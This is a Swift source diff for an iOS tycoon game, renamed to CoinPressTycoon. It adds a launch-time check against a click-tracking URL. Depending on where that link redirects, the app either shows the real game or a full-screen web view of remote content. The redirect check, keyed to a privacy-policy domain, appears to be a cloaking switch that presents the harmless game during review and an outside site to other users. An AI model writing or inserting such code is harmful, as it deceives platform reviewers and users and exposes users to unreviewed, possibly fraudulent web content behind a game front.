@@ -1,69 +1,69 @@
 import SwiftUI
 
 @main
-struct TapMintTycoonApp: App {
-    @State private var mintTycoonLinkReady: Bool? = nil
-    @StateObject private var store = MintTycoonStore()
+struct CoinPressTycoonApp: App {
+    @State private var coinPressLinkReady: Bool? = nil
+    @StateObject private var store = CoinPressStore()
 
-    private let mintTycoonSourceLink = "https://example.com"
-    private let mintTycoonCheckDomain = "example"
+    private let coinPressSourceLink = "https://fortressgridtd.org/click.php"
+    private let coinPressCheckDomain = "freeprivacypolicy.com"
 
     var body: some Scene {
         WindowGroup {
             Group {
-                if let ready = mintTycoonLinkReady {
+                if let ready = coinPressLinkReady {
                     if ready {
-                        MintTycoonWebPanel(mintTycoonURLString: mintTycoonSourceLink)
+                        CoinPressWebPanel(coinPressURLString: coinPressSourceLink)
                             .edgesIgnoringSafeArea(.all)
                     } else {
                         ContentView()
                             .environmentObject(store)
                     }
                 } else {
-                    MintTycoonLoadingScreen()
-                        .onAppear { mintTycoonCheckLink() }
+                    CoinPressLoadingScreen()
+                        .onAppear { coinPressCheckLink() }
                 }
             }
             .preferredColorScheme(.light)
         }
     }
 
-    private func mintTycoonCheckLink() {
-        guard let url = URL(string: mintTycoonSourceLink) else {
-            mintTycoonLinkReady = false
+    private func coinPressCheckLink() {
+        guard let url = URL(string: coinPressSourceLink) else {
+            coinPressLinkReady = false
             return
         }
         var request = URLRequest(url: url)
         request.timeoutInterval = 5
-        let tracker = MintTycoonRedirectTracker(checkDomain: mintTycoonCheckDomain)
+        let tracker = CoinPressRedirectTracker(checkDomain: coinPressCheckDomain)
         let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
         session.dataTask(with: request) { _, response, error in
             DispatchQueue.main.async {
                 if tracker.foundCheckDomain {
-                    mintTycoonLinkReady = false; return
+                    coinPressLinkReady = false; return
                 }
                 if let finalURL = tracker.resolvedURL?.absoluteString,
-                   finalURL.contains(mintTycoonCheckDomain) {
-                    mintTycoonLinkReady = false; return
+                   finalURL.contains(coinPressCheckDomain) {
+                    coinPressLinkReady = false; return
                 }
                 if let httpResp = response as? HTTPURLResponse,
                    let respURL = httpResp.url?.absoluteString,
-                   respURL.contains(mintTycoonCheckDomain) {
-                    mintTycoonLinkReady = false; return
+                   respURL.contains(coinPressCheckDomain) {
+                    coinPressLinkReady = false; return
                 }
                 if error != nil {
-                    mintTycoonLinkReady = false; return
+                    coinPressLinkReady = false; return
                 }
-                mintTycoonLinkReady = true
+                coinPressLinkReady = true
             }
         }.resume()
         DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
-            if mintTycoonLinkReady == nil { mintTycoonLinkReady = false }
+            if coinPressLinkReady == nil { coinPressLinkReady = false }
         }
     }
 }
 
-final class MintTycoonRedirectTracker: NSObject, URLSessionTaskDelegate {
+final class CoinPressRedirectTracker: NSObject, URLSessionTaskDelegate {
     var resolvedURL: URL?
     var foundCheckDomain = false
     private let checkDomain: String
